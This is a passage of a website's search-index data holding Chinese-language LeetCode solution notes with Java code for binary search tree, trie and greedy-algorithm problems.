Leetcode / \u529B\u6263 _______6______ / \\ ___2__ ___8__ / \\ / \\
0 4 7 9 / \\ 3 5 For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.
public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { if (root.val > p.val && root.val > q.val) return lowestCommonAncestor(root.left, p, q); if (root.val < p.val && root.val < q.val) return lowestCommonAncestor(root.right, p, q); return root;
}`},{header:"5. \u4E8C\u53C9\u6811\u7684\u6700\u8FD1\u516C\u5171\u7956\u5148",slug:"_5-\u4E8C\u53C9\u6811\u7684\u6700\u8FD1\u516C\u5171\u7956\u5148",content:`236. Lowest Common Ancestor of a Binary Tree (Medium)
Leetcode / \u529B\u6263 _______3______ / \\ ___5__ ___1__ / \\ / \\
6 2 0 8 / \\ 7 4 For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition.
public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { if (root == null || root == p || root == q) return root; TreeNode left = lowestCommonAncestor(root.left, p, q); TreeNode right = lowestCommonAncestor(root.right, p, q); return left == null ? right : right == null ? left : root;
}`},{header:"6. \u4ECE\u6709\u5E8F\u6570\u7EC4\u4E2D\u6784\u9020\u4E8C\u53C9\u67E5\u627E\u6811",slug:"_6-\u4ECE\u6709\u5E8F\u6570\u7EC4\u4E2D\u6784\u9020\u4E8C\u53C9\u67E5\u627E\u6811",content:`108. Convert Sorted Array to Binary Search Tree (Easy)
Leetcode / \u529B\u6263
public TreeNode sortedArrayToBST(int[] nums) { return toBST(nums, 0, nums.length - 1);
} private TreeNode toBST(int[] nums, int sIdx, int eIdx){ if (sIdx > eIdx) return null; int mIdx = (sIdx + eIdx) / 2; TreeNode root = new TreeNode(nums[mIdx]); root.left = toBST(nums, sIdx, mIdx - 1); root.right = toBST(nums, mIdx + 1, eIdx); return root;
}`},{header:"7. \u6839\u636E\u6709\u5E8F\u94FE\u8868\u6784\u9020\u5E73\u8861\u7684\u4E8C\u53C9\u67E5\u627E\u6811",slug:"_7-\u6839\u636E\u6709\u5E8F\u94FE\u8868\u6784\u9020\u5E73\u8861\u7684\u4E8C\u53C9\u67E5\u627E\u6811",content:`109. Convert Sorted List to Binary Search Tree (Medium)
Leetcode / \u529B\u6263
Given the sorted linked list: [-10,-3,0,5,9], One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST: 0 / \\ -3 9 / / -10 5
public TreeNode sortedListToBST(ListNode head) { if (head == null) return null; if (head.next == null) return new TreeNode(head.val); ListNode preMid = preMid(head); ListNode mid = preMid.next; preMid.next = null; // \u65AD\u5F00\u94FE\u8868 TreeNode t = new TreeNode(mid.val); t.left = sortedListToBST(head); t.right = sortedListToBST(mid.next); return t;
} private ListNode preMid(ListNode head) { ListNode slow = head, fast = head.next; ListNode pre = head; while (fast != null && fast.next != null) { pre = slow; slow = slow.next; fast = fast.next.next; } return pre;
}`},{header:"8. \u5728\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u5BFB\u627E\u4E24\u4E2A\u8282\u70B9\uFF0C\u4F7F\u5B83\u4EEC\u7684\u548C\u4E3A\u4E00\u4E2A\u7ED9\u5B9A\u503C",slug:"_8-\u5728\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u5BFB\u627E\u4E24\u4E2A\u8282\u70B9-\u4F7F\u5B83\u4EEC\u7684\u548C\u4E3A\u4E00\u4E2A\u7ED9\u5B9A\u503C",content:`653. Two Sum IV - Input is a BST (Easy)
Leetcode / \u529B\u6263
Input: 5 / \\ 3 6 / \\ \\
2 4 7 Target = 9 Output: True
\u4F7F\u7528\u4E2D\u5E8F\u904D\u5386\u5F97\u5230\u6709\u5E8F\u6570\u7EC4\u4E4B\u540E\uFF0C\u518D\u5229\u7528\u53CC\u6307\u9488\u5BF9\u6570\u7EC4\u8FDB\u884C\u67E5\u627E\u3002
\u5E94\u8BE5\u6CE8\u610F\u5230\uFF0C\u8FD9\u4E00\u9898\u4E0D\u80FD\u7528\u5206\u522B\u5728\u5DE6\u53F3\u5B50\u6811\u4E24\u90E8\u5206\u6765\u5904\u7406\u8FD9\u79CD\u601D\u60F3\uFF0C\u56E0\u4E3A\u4E24\u4E2A\u5F85\u6C42\u7684\u8282\u70B9\u53EF\u80FD\u5206\u522B\u5728\u5DE6\u53F3\u5B50\u6811\u4E2D\u3002
public boolean findTarget(TreeNode root, int k) { List<Integer> nums = new ArrayList<>(); inOrder(root, nums); int i = 0, j = nums.size() - 1; while (i < j) { int sum = nums.get(i) + nums.get(j); if (sum == k) return true; if (sum < k) i++; else j--; } return false;
} private void inOrder(TreeNode root, List<Integer> nums) { if (root == null) return; inOrder(root.left, nums); nums.add(root.val); inOrder(root.right, nums);
}`},{header:"9. \u5728\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u67E5\u627E\u4E24\u4E2A\u8282\u70B9\u4E4B\u5DEE\u7684\u6700\u5C0F\u7EDD\u5BF9\u503C",slug:"_9-\u5728\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u67E5\u627E\u4E24\u4E2A\u8282\u70B9\u4E4B\u5DEE\u7684\u6700\u5C0F\u7EDD\u5BF9\u503C",content:`530. Minimum Absolute Difference in BST (Easy)
Leetcode / \u529B\u6263
Input: 1 \\ 3 / 2 Output: 1
\u5229\u7528\u4E8C\u53C9\u67E5\u627E\u6811\u7684\u4E2D\u5E8F\u904D\u5386\u4E3A\u6709\u5E8F\u7684\u6027\u8D28\uFF0C\u8BA1\u7B97\u4E2D\u5E8F\u904D\u5386\u4E2D\u4E34\u8FD1\u7684\u4E24\u4E2A\u8282\u70B9\u4E4B\u5DEE\u7684\u7EDD\u5BF9\u503C\uFF0C\u53D6\u6700\u5C0F\u503C\u3002
private int minDiff = Integer.MAX_VALUE;
private TreeNode preNode = null; public int getMinimumDifference(TreeNode root) { inOrder(root); return minDiff;
} private void inOrder(TreeNode node) { if (node == null) return; inOrder(node.left); if (preNode != null) minDiff = Math.min(minDiff, node.val - preNode.val); preNode = node; inOrder(node.right);
}`},{header:"10. \u5BFB\u627E\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u51FA\u73B0\u6B21\u6570\u6700\u591A\u7684\u503C",slug:"_10-\u5BFB\u627E\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u51FA\u73B0\u6B21\u6570\u6700\u591A\u7684\u503C",content:`501. Find Mode in Binary Search Tree (Easy)
Leetcode / \u529B\u6263 1 \\ 2 / 2 return [2].
\u7B54\u6848\u53EF\u80FD\u4E0D\u6B62\u4E00\u4E2A\uFF0C\u4E5F\u5C31\u662F\u6709\u591A\u4E2A\u503C\u51FA\u73B0\u7684\u6B21\u6570\u4E00\u6837\u591A\u3002
private int curCnt = 1;
private int maxCnt = 1;
private TreeNode preNode = null; public int[] findMode(TreeNode root) { List<Integer> maxCntNums = new ArrayList<>(); inOrder(root, maxCntNums); int[] ret = new int[maxCntNums.size()]; int idx = 0; for (int num : maxCntNums) { ret[idx++] = num; } return ret;
} private void inOrder(TreeNode node, List<Integer> nums) { if (node == null) return; inOrder(node.left, nums); if (preNode != null) { if (preNode.val == node.val) curCnt++; else curCnt = 1; } if (curCnt > maxCnt) { maxCnt = curCnt; nums.clear(); nums.add(node.val); } else if (curCnt == maxCnt) { nums.add(node.val); } preNode = node; inOrder(node.right, nums);
}`},{header:"Trie",slug:"trie",content:"Trie\uFF0C\u53C8\u79F0\u524D\u7F00\u6811\u6216\u5B57\u5178\u6811\uFF0C\u7528\u4E8E\u5224\u65AD\u5B57\u7B26\u4E32\u662F\u5426\u5B58\u5728\u6216\u8005\u662F\u5426\u5177\u6709\u67D0\u79CD\u5B57\u7B26\u4E32\u524D\u7F00\u3002"},{header:"1. \u5B9E\u73B0\u4E00\u4E2A Trie",slug:"_1-\u5B9E\u73B0\u4E00\u4E2A-trie",content:`208. Implement Trie (Prefix Tree) (Medium)
Leetcode / \u529B\u6263
class Trie { private class Node { Node[] childs = new Node[26]; boolean isLeaf; } private Node root = new Node(); public Trie() { } public void insert(String word) { insert(word, root); } private void insert(String word, Node node) { if (node == null) return; if (word.length() == 0) { node.isLeaf = true; return; } int index = indexForChar(word.charAt(0)); if (node.childs[index] == null) { node.childs[index] = new Node(); } insert(word.substring(1), node.childs[index]); } public boolean search(String word) { return search(word, root); } private boolean search(String word, Node node) { if (node == null) return false; if (word.length() == 0) return node.isLeaf; int index = indexForChar(word.charAt(0)); return search(word.substring(1), node.childs[index]); } public boolean startsWith(String prefix) { return startWith(prefix, root); } private boolean startWith(String prefix, Node node) { if (node == null) return false; if (prefix.length() == 0) return true; int index = indexForChar(prefix.charAt(0)); return startWith(prefix.substring(1), node.childs[index]); } private int indexForChar(char c) { return c - 'a'; }
}`},{header:"2. \u5B9E\u73B0\u4E00\u4E2A Trie\uFF0C\u7528\u6765\u6C42\u524D\u7F00\u548C",slug:"_2-\u5B9E\u73B0\u4E00\u4E2A-trie-\u7528\u6765\u6C42\u524D\u7F00\u548C",content:`677. Map Sum Pairs (Medium)
Leetcode / \u529B\u6263
Input: insert("apple", 3), Output: Null
Input: sum("ap"), Output: 3
Input: insert("app", 2), Output: Null
Input: sum("ap"), Output: 5
class MapSum { private class Node { Node[] child = new Node[26]; int value; } private Node root = new Node(); public MapSum() { } public void insert(String key, int val) { insert(key, root, val); } private void insert(String key, Node node, int val) { if (node == null) return; if (key.length() == 0) { node.value = val; return; } int index = indexForChar(key.charAt(0)); if (node.child[index] == null) { node.child[index] = new Node(); } insert(key.substring(1), node.child[index], val); } public int sum(String prefix) { return sum(prefix, root); } private int sum(String prefix, Node node) { if (node == null) return 0; if (prefix.length() != 0) { int index = indexForChar(prefix.charAt(0)); return sum(prefix.substring(1), node.child[index]); } int sum = node.value; for (Node child : node.child) { sum += sum(prefix, child); } return sum; } private int indexForChar(char c) { return c - 'a'; }
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E7%9B%AE%E5%BD%95.html",title:"Leetcode \u9898\u89E3",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3",slug:"leetcode-\u9898\u89E3",content:""},{header:"\u524D\u8A00",slug:"\u524D\u8A00",content:"\u672C\u6587\u4ECE Leetcode \u4E2D\u7CBE\u9009\u5927\u6982 200 \u5DE6\u53F3\u7684\u9898\u76EE\uFF0C\u53BB\u9664\u4E86\u67D0\u4E9B\u7E41\u6742\u4F46\u662F\u6CA1\u6709\u591A\u5C11\u7B97\u6CD5\u601D\u60F3\u7684\u9898\u76EE\uFF0C\u540C\u65F6\u4FDD\u7559\u4E86\u9762\u8BD5\u4E2D\u7ECF\u5E38\u88AB\u95EE\u5230\u7684\u7ECF\u5178\u9898\u76EE\u3002"},{header:"\u7B97\u6CD5\u601D\u60F3",slug:"\u7B97\u6CD5\u601D\u60F3",content:`\u53CC\u6307\u9488
\u6392\u5E8F
\u8D2A\u5FC3\u601D\u60F3
\u4E8C\u5206\u67E5\u627E
\u5206\u6CBB
\u641C\u7D22
\u52A8\u6001\u89C4\u5212
\u6570\u5B66`},{header:"\u6570\u636E\u7ED3\u6784\u76F8\u5173",slug:"\u6570\u636E\u7ED3\u6784\u76F8\u5173",content:`\u94FE\u8868
\u6811
\u6808\u548C\u961F\u5217
\u54C8\u5E0C\u8868
\u5B57\u7B26\u4E32
\u6570\u7EC4\u4E0E\u77E9\u9635
\u56FE
\u4F4D\u8FD0\u7B97`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`Leetcode
Weiss M A, \u51AF\u821C\u73BA. \u6570\u636E\u7ED3\u6784\u4E0E\u7B97\u6CD5\u5206\u6790\u2014\u2014C \u8BED\u8A00\u63CF\u8FF0[J]. 2004.
Sedgewick R. Algorithms[M]. Pearson Education India, 1988.
\u4F55\u6D77\u6D9B, \u8F6F\u4EF6\u5DE5\u7A0B\u5E08. \u5251\u6307 Offer: \u540D\u4F01\u9762\u8BD5\u5B98\u7CBE\u8BB2\u5178\u578B\u7F16\u7A0B\u9898[M]. \u7535\u5B50\u5DE5\u4E1A\u51FA\u7248\u793E, 2014.
\u300A\u7F16\u7A0B\u4E4B\u7F8E\u300B\u5C0F\u7EC4. \u7F16\u7A0B\u4E4B\u7F8E[M]. \u7535\u5B50\u5DE5\u4E1A\u51FA\u7248\u793E, 2008.
\u5DE6\u7A0B\u4E91. \u7A0B\u5E8F\u5458\u4EE3\u7801\u9762\u8BD5\u6307\u5357[M]. \u7535\u5B50\u5DE5\u4E1A\u51FA\u7248\u793E, 2015.`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E8%B4%AA%E5%BF%83%E6%80%9D%E6%83%B3.html",title:"Leetcode \u9898\u89E3 - \u8D2A\u5FC3\u601D\u60F3",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u8D2A\u5FC3\u601D\u60F3",slug:"leetcode-\u9898\u89E3-\u8D2A\u5FC3\u601D\u60F3",content:`Leetcode \u9898\u89E3 - \u8D2A\u5FC3\u601D\u60F3 1. \u5206\u914D\u997C\u5E72
2. \u4E0D\u91CD\u53E0\u7684\u533A\u95F4\u4E2A\u6570
3. \u6295\u98DE\u9556\u523A\u7834\u6C14\u7403
4. \u6839\u636E\u8EAB\u9AD8\u548C\u5E8F\u53F7\u91CD\u7EC4\u961F\u5217
5. \u4E70\u5356\u80A1\u7968\u6700\u5927\u7684\u6536\u76CA
6. \u4E70\u5356\u80A1\u7968\u7684\u6700\u5927\u6536\u76CA II
7. \u79CD\u690D\u82B1\u6735
8. \u5224\u65AD\u662F\u5426\u4E3A\u5B50\u5E8F\u5217
9. \u4FEE\u6539\u4E00\u4E2A\u6570\u6210\u4E3A\u975E\u9012\u51CF\u6570\u7EC4
10. \u5B50\u6570\u7EC4\u6700\u5927\u7684\u548C
11. \u5206\u9694\u5B57\u7B26\u4E32\u4F7F\u540C\u79CD\u5B57\u7B26\u51FA\u73B0\u5728\u4E00\u8D77 \u4FDD\u8BC1\u6BCF\u6B21\u64CD\u4F5C\u90FD\u662F\u5C40\u90E8\u6700\u4F18\u7684\uFF0C\u5E76\u4E14\u6700\u540E\u5F97\u5230\u7684\u7ED3\u679C\u662F\u5168\u5C40\u6700\u4F18\u7684\u3002`},{header:"1. \u5206\u914D\u997C\u5E72",slug:"_1-\u5206\u914D\u997C\u5E72",content:`455. Assign Cookies (Easy)
Leetcode / \u529B\u6263
Input: grid[1,3], size[1,2,4]
Output: 2
\u9898\u76EE\u63CF\u8FF0\uFF1A\u6BCF\u4E2A\u5B69\u5B50\u90FD\u6709\u4E00\u4E2A\u6EE1\u8DB3\u5EA6 grid\uFF0C\u6BCF\u4E2A\u997C\u5E72\u90FD\u6709\u4E00\u4E2A\u5927\u5C0F size\uFF0C\u53EA\u6709\u997C\u5E72\u7684\u5927\u5C0F\u5927\u4E8E\u7B49\u4E8E\u4E00\u4E2A\u5B69\u5B50\u7684\u6EE1\u8DB3\u5EA6\uFF0C\u8BE5\u5B69\u5B50\u624D\u4F1A\u83B7\u5F97\u6EE1\u8DB3\u3002\u6C42\u89E3\u6700\u591A\u53EF\u4EE5\u83B7\u5F97\u6EE1\u8DB3\u7684\u5B69\u5B50\u6570\u91CF\u3002 \u7ED9\u4E00\u4E2A\u5B69\u5B50\u7684\u997C\u5E72\u5E94\u5F53\u5C3D\u91CF\u5C0F\u5E76\u4E14\u53C8\u80FD\u6EE1\u8DB3\u8BE5\u5B69\u5B50\uFF0C\u8FD9\u6837\u5927\u997C\u5E72\u624D\u80FD\u62FF\u6765\u7ED9\u6EE1\u8DB3\u5EA6\u6BD4\u8F83\u5927\u7684\u5B69\u5B50\u3002
\u56E0\u4E3A\u6EE1\u8DB3\u5EA6\u6700\u5C0F\u7684\u5B69\u5B50\u6700\u5BB9\u6613\u5F97\u5230\u6EE1\u8DB3\uFF0C\u6240\u4EE5\u5148\u6EE1\u8DB3\u6EE1\u8DB3\u5EA6\u6700\u5C0F\u7684\u5B69\u5B50\u3002 \u5728\u4EE5\u4E0A\u7684\u89E3\u6CD5\u4E2D\uFF0C\u6211\u4EEC\u53EA\u5728\u6BCF\u6B21\u5206\u914D\u65F6\u997C\u5E72\u65F6\u9009\u62E9\u4E00\u79CD\u770B\u8D77\u6765\u662F\u5F53\u524D\u6700\u4F18\u7684\u5206\u914D\u65B9\u6CD5\uFF0C\u4F46\u65E0\u6CD5\u4FDD\u8BC1\u8FD9\u79CD\u5C40\u90E8\u6700\u4F18\u7684\u5206\u914D\u65B9\u6CD5\u6700\u540E\u80FD\u5F97\u5230\u5168\u5C40\u6700\u4F18\u89E3\u3002\u6211\u4EEC\u5047\u8BBE\u80FD\u5F97\u5230\u5168\u5C40\u6700\u4F18\u89E3\uFF0C\u5E76\u4F7F\u7528\u53CD\u8BC1\u6CD5\u8FDB\u884C\u8BC1\u660E\uFF0C\u5373\u5047\u8BBE\u5B58\u5728\u4E00\u79CD\u6BD4\u6211\u4EEC\u4F7F\u7528\u7684\u8D2A\u5FC3\u7B56\u7565\u66F4\u4F18\u7684\u6700\u4F18\u7B56\u7565\u3002\u5982\u679C\u4E0D\u5B58\u5728\u8FD9\u79CD\u6700\u4F18\u7B56\u7565\uFF0C\u8868\u793A\u8D2A\u5FC3\u7B56\u7565\u5C31\u662F\u6700\u4F18\u7B56\u7565\uFF0C\u5F97\u5230\u7684\u89E3\u4E5F\u5C31\u662F\u5168\u5C40\u6700\u4F18\u89E3\u3002
\u8BC1\u660E\uFF1A\u5047\u8BBE\u5728\u67D0\u6B21\u9009\u62E9\u4E2D\uFF0C\u8D2A\u5FC3\u7B56\u7565\u9009\u62E9\u7ED9\u5F53\u524D\u6EE1\u8DB3\u5EA6\u6700\u5C0F\u7684\u5B69\u5B50\u5206\u914D\u7B2C m \u4E2A\u997C\u5E72\uFF0C\u7B2C m \u4E2A\u997C\u5E72\u4E3A\u53EF\u4EE5\u6EE1\u8DB3\u8BE5\u5B69\u5B50\u7684\u6700\u5C0F\u997C\u5E72\u3002\u5047\u8BBE\u5B58\u5728\u4E00\u79CD\u6700\u4F18\u7B56\u7565\uFF0C\u53EF\u4EE5\u7ED9\u8BE5\u5B69\u5B50\u5206\u914D\u7B2C n \u4E2A\u997C\u5E72\uFF0C\u5E76\u4E14 m < n\u3002\u6211\u4EEC\u53EF\u4EE5\u53D1\u73B0\uFF0C\u7ECF\u8FC7\u8FD9\u4E00\u8F6E\u5206\u914D\uFF0C\u8D2A\u5FC3\u7B56\u7565\u5206\u914D\u540E\u5269\u4E0B\u7684\u997C\u5E72\u4E00\u5B9A\u6709\u4E00\u4E2A\u6BD4\u6700\u4F18\u7B56\u7565\u6765\u5F97\u5927\u3002\u56E0\u6B64\u5728\u540E\u7EED\u7684\u5206\u914D\u4E2D\uFF0C\u8D2A\u5FC3\u7B56\u7565\u4E00\u5B9A\u80FD\u6EE1\u8DB3\u66F4\u591A\u7684\u5B69\u5B50\u3002\u4E5F\u5C31\u662F\u8BF4\u4E0D\u5B58\u5728\u6BD4\u8D2A\u5FC3\u7B56\u7565\u66F4\u4F18\u7684\u7B56\u7565\uFF0C\u5373\u8D2A\u5FC3\u7B56\u7565\u5C31\u662F\u6700\u4F18\u7B56\u7565\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e69537d2-a016-4676-b169-9ea17eeb9037.gif" width="430px">
public int findContentChildren(int[] grid, int[] size) { if (grid == null || size == null) return 0; Arrays.sort(grid); Arrays.sort(size); int gi = 0, si = 0; while (gi < grid.length && si < size.length) { if (grid[gi] <= size[si]) { gi++; } si++; } return gi;
}`},{header:"2. \u4E0D\u91CD\u53E0\u7684\u533A\u95F4\u4E2A\u6570",slug:"_2-\u4E0D\u91CD\u53E0\u7684\u533A\u95F4\u4E2A\u6570",content:`435. Non-overlapping Intervals (Medium)
Leetcode / \u529B\u6263
Input: [ [1,2], [1,2], [1,2] ] Output: 2 Explanation: You need to remove two [1,2] to make the rest of intervals non-overlapping.
Input: [ [1,2], [2,3] ] Output: 0 Explanation: You don't need to remove any of the intervals since they're already non-overlapping.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u8BA1\u7B97\u8BA9\u4E00\u7EC4\u533A\u95F4\u4E0D\u91CD\u53E0\u6240\u9700\u8981\u79FB\u9664\u7684\u533A\u95F4\u4E2A\u6570\u3002
\u5148\u8BA1\u7B97\u6700\u591A\u80FD\u7EC4\u6210\u7684\u4E0D\u91CD\u53E0\u533A\u95F4\u4E2A\u6570\uFF0C\u7136\u540E\u7528\u533A\u95F4\u603B\u4E2A\u6570\u51CF\u53BB\u4E0D\u91CD\u53E0\u533A\u95F4\u7684\u4E2A\u6570\u3002
\u5728\u6BCF\u6B21\u9009\u62E9\u4E2D\uFF0C\u533A\u95F4\u7684\u7ED3\u5C3E\u6700\u4E3A\u91CD\u8981\uFF0C\u9009\u62E9\u7684\u533A\u95F4\u7ED3\u5C3E\u8D8A\u5C0F\uFF0C\u7559\u7ED9\u540E\u9762\u7684\u533A\u95F4\u7684\u7A7A\u95F4\u8D8A\u5927\uFF0C\u90A3\u4E48\u540E\u9762\u80FD\u591F\u9009\u62E9\u7684\u533A\u95F4\u4E2A\u6570\u4E5F\u5C31\u8D8A\u5927\u3002
\u6309\u533A\u95F4\u7684\u7ED3\u5C3E\u8FDB\u884C\u6392\u5E8F\uFF0C\u6BCF\u6B21\u9009\u62E9\u7ED3\u5C3E\u6700\u5C0F\uFF0C\u5E76\u4E14\u548C\u524D\u4E00\u4E2A\u533A\u95F4\u4E0D\u91CD\u53E0\u7684\u533A\u95F4\u3002
public int eraseOverlapIntervals(int[][] intervals) { if (intervals.length == 0) { return 0; } Arrays.sort(intervals, Comparator.comparingInt(o -> o[1])); int cnt = 1; int end = intervals[0][1]; for (int i = 1; i < intervals.length; i++) { if (intervals[i][0] < end) { continue; } end = intervals[i][1]; cnt++; } return intervals.length - cnt;
}
\u4F7F\u7528 lambda \u8868\u793A\u5F0F\u521B\u5EFA Comparator \u4F1A\u5BFC\u81F4\u7B97\u6CD5\u8FD0\u884C\u65F6\u95F4\u8FC7\u957F\uFF0C\u5982\u679C\u6CE8\u91CD\u8FD0\u884C\u65F6\u95F4\uFF0C\u53EF\u4EE5\u4FEE\u6539\u4E3A\u666E\u901A\u521B\u5EFA Comparator \u8BED\u53E5\uFF1A
Arrays.sort(intervals, new Comparator<int[]>() { @Override public int compare(int[] o1, int[] o2) { return (o1[1] < o2[1]) ? -1 : ((o1[1] == o2[1]) ? 0 : 1); }
});
\u5B9E\u73B0 compare() \u51FD\u6570\u65F6\u907F\u514D\u4F7F\u7528 return o1[1] - o2[1]; \u8FD9\u79CD\u51CF\u6CD5\u64CD\u4F5C\uFF0C\u9632\u6B62\u6EA2\u51FA\u3002`},{header:"3. \u6295\u98DE\u9556\u523A\u7834\u6C14\u7403",slug:"_3-\u6295\u98DE\u9556\u523A\u7834\u6C14\u7403",content:`452. Minimum Number of Arrows to Burst Balloons (Medium)
Leetcode / \u529B\u6263
Input:
[[10,16], [2,8], [1,6], [7,12]] Output:
2
\u9898\u76EE\u63CF\u8FF0\uFF1A\u6C14\u7403\u5728\u4E00\u4E2A\u6C34\u5E73\u6570\u8F74\u4E0A\u6446\u653E\uFF0C\u53EF\u4EE5\u91CD\u53E0\uFF0C\u98DE\u9556\u5782\u76F4\u6295\u5411\u5750\u6807\u8F74\uFF0C\u4F7F\u5F97\u8DEF\u5F84\u4E0A\u7684\u6C14\u7403\u90FD\u88AB\u523A\u7834\u3002\u6C42\u89E3\u6700\u5C0F\u7684\u6295\u98DE\u9556\u6B21\u6570\u4F7F\u6240\u6709\u6C14\u7403\u90FD\u88AB\u523A\u7834\u3002
\u4E5F\u662F\u8BA1\u7B97\u4E0D\u91CD\u53E0\u7684\u533A\u95F4\u4E2A\u6570\uFF0C\u4E0D\u8FC7\u548C Non-overlapping Intervals \u7684\u533A\u522B\u5728\u4E8E\uFF0C[1, 2] \u548C [2, 3] \u5728\u672C\u9898\u4E2D\u7B97\u662F\u91CD\u53E0\u533A\u95F4\u3002
public int findMinArrowShots(int[][] points) { if (points.length == 0) { return 0; } Arrays.sort(points, Comparator.comparingInt(o -> o[1])); int cnt = 1, end = points[0][1]; for (int i = 1; i < points.length; i++) { if (points[i][0] <= end) { continue; } cnt++; end = points[i][1]; } return cnt;
}`},{header:"4. \u6839\u636E\u8EAB\u9AD8\u548C\u5E8F\u53F7\u91CD\u7EC4\u961F\u5217",slug:"_4-\u6839\u636E\u8EAB\u9AD8\u548C\u5E8F\u53F7\u91CD\u7EC4\u961F\u5217",content:`406. Queue Reconstruction by Height(Medium)
Leetcode / \u529B\u6263
Input:
[[7,0], [4,4], [7,1], [5,0], [6,1], [5,2]] Output:
[[5,0], [7,0], [5,2], [6,1], [4,4], [7,1]]
\u9898\u76EE\u63CF\u8FF0\uFF1A\u4E00\u4E2A\u5B66\u751F\u7528\u4E24\u4E2A\u5206\u91CF (h, k) \u63CF\u8FF0\uFF0Ch \u8868\u793A\u8EAB\u9AD8\uFF0Ck \u8868\u793A\u6392\u5728\u524D\u9762\u7684\u6709 k \u4E2A\u5B66\u751F\u7684\u8EAB\u9AD8\u6BD4\u4ED6\u9AD8\u6216\u8005\u548C\u4ED6\u4E00\u6837\u9AD8\u3002
\u4E3A\u4E86\u4F7F\u63D2\u5165\u64CD\u4F5C\u4E0D\u5F71\u54CD\u540E\u7EED\u7684\u64CD\u4F5C\uFF0C\u8EAB\u9AD8\u8F83\u9AD8\u7684\u5B66\u751F\u5E94\u8BE5\u5148\u505A\u63D2\u5165\u64CD\u4F5C\uFF0C\u5426\u5219\u8EAB\u9AD8\u8F83\u5C0F\u7684\u5B66\u751F\u539F\u5148\u6B63\u786E\u63D2\u5165\u7684\u7B2C k \u4E2A\u4F4D\u7F6E\u53EF\u80FD\u4F1A\u53D8\u6210\u7B2C k+1 \u4E2A\u4F4D\u7F6E\u3002
\u8EAB\u9AD8 h \u964D\u5E8F\u3001\u4E2A\u6570 k \u503C\u5347\u5E8F\uFF0C\u7136\u540E\u5C06\u67D0\u4E2A\u5B66\u751F\u63D2\u5165\u961F\u5217\u7684\u7B2C k \u4E2A\u4F4D\u7F6E\u4E2D\u3002
public int[][] reconstructQueue(int[][] people) { if (people == null || people.length == 0 || people[0].length == 0) { return new int[0][0]; } Arrays.sort(people, (a, b) -> (a[0] == b[0] ? a[1] - b[1] : b[0] - a[0])); List<int[]> queue = new ArrayList<>(); for (int[] p : people) { queue.add(p[1], p); } return queue.toArray(new int[queue.size()][]);
}`},{header:"5. \u4E70\u5356\u80A1\u7968\u6700\u5927\u7684\u6536\u76CA",slug:"_5-\u4E70\u5356\u80A1\u7968\u6700\u5927\u7684\u6536\u76CA",content:`121. Best Time to Buy and Sell Stock (Easy)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1A\u4E00\u6B21\u80A1\u7968\u4EA4\u6613\u5305\u542B\u4E70\u5165\u548C\u5356\u51FA\uFF0C\u53EA\u8FDB\u884C\u4E00\u6B21\u4EA4\u6613\uFF0C\u6C42\u6700\u5927\u6536\u76CA\u3002
\u53EA\u8981\u8BB0\u5F55\u524D\u9762\u7684\u6700\u5C0F\u4EF7\u683C\uFF0C\u5C06\u8FD9\u4E2A\u6700\u5C0F\u4EF7\u683C\u4F5C\u4E3A\u4E70\u5165\u4EF7\u683C\uFF0C\u7136\u540E\u5C06\u5F53\u524D\u7684\u4EF7\u683C\u4F5C\u4E3A\u552E\u51FA\u4EF7\u683C\uFF0C\u67E5\u770B\u5F53\u524D\u6536\u76CA\u662F\u4E0D\u662F\u6700\u5927\u6536\u76CA\u3002
public int maxProfit(int[] prices) { int n = prices.length; if (n == 0) return 0; int soFarMin = prices[0]; int max = 0; for (int i = 1; i < n; i++) { if (soFarMin > prices[i]) soFarMin = prices[i]; else max = Math.max(max, prices[i] - soFarMin); } return max;
}`},{header:"6. \u4E70\u5356\u80A1\u7968\u7684\u6700\u5927\u6536\u76CA II",slug:"_6-\u4E70\u5356\u80A1\u7968\u7684\u6700\u5927\u6536\u76CA-ii",content:`122. Best Time to Buy and Sell Stock II (Easy)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1A\u53EF\u4EE5\u8FDB\u884C\u591A\u6B21\u4EA4\u6613\uFF0C\u591A\u6B21\u4EA4\u6613\u4E4B\u95F4\u4E0D\u80FD\u4EA4\u53C9\u8FDB\u884C\uFF0C\u53EF\u4EE5\u8FDB\u884C\u591A\u6B21\u4EA4\u6613\u3002
\u5BF9\u4E8E [a, b, c, d]\uFF0C\u5982\u679C\u6709 a <= b <= c <= d \uFF0C\u90A3\u4E48\u6700\u5927\u6536\u76CA\u4E3A d - a\u3002\u800C d - a = (d - c) + (c - b) + (b - a) \uFF0C\u56E0\u6B64\u5F53\u8BBF\u95EE\u5230\u4E00\u4E2A prices[i] \u4E14 prices[i] - prices[i-1] > 0\uFF0C\u90A3\u4E48\u5C31\u628A prices[i] - prices[i-1] \u6DFB\u52A0\u5230\u6536\u76CA\u4E2D\u3002
public int maxProfit(int[] prices) { int profit = 0; for (int i = 1; i < prices.length; i++) { if (prices[i] > prices[i - 1]) { profit += (prices[i] - prices[i - 1]); } } return profit;
}`},{header:"7. \u79CD\u690D\u82B1\u6735",slug:"_7-\u79CD\u690D\u82B1\u6735",content:`605. Can Place Flowers (Easy)
Leetcode / \u529B\u6263
Input: flowerbed = [1,0,0,0,1], n = 1
Output: True
